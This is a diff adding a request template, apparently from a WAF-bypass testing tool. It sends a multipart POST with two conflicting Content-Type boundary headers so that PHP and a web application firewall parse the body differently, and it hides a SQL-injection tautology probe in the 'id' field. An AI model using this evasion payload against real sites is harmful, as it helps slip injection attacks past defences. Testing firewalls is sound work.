@@ -1,0 +1,20 @@
+# @name: multipart双Content-Type头
+# @tags: post,multipart,double,content-type,boundary,php,id,bypass
+# @color: purple
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_double_content_type
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 发送两个 Content-Type 头各带不同 boundary，PHP 与 WAF 可能选取不同 boundary 切分 part，导致 WAF 用错误的 boundary 解析不到参数。PHP 实际使用 boundary=a。参考 do9gy multipart Part1 第7条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+Content-Type: multipart/form-data; boundary=b
+
+--a
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--a--
